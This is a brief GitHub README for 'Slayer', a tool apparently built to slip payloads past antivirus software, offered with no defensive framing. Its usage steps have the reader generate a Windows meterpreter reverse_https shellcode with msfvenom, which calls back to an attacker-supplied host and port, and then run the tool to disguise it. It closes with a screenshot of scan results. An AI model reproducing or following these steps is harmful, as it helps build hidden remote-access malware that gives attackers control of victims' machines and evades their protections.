# Slayer

Just a AV slayer. Nothing special ;)

### USAGE
git clone https://github.com/mertdas/slayer.git && apt-get install mingw-w64*

cd slayer

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR IP LPORT=YOUR PORT -f raw -o shellcode.raw

python3 slayer.py

### Scan Results

![image](https://user-images.githubusercontent.com/48562581/152684537-d445638f-c73b-46cb-a809-dfaa5a65b334.png)
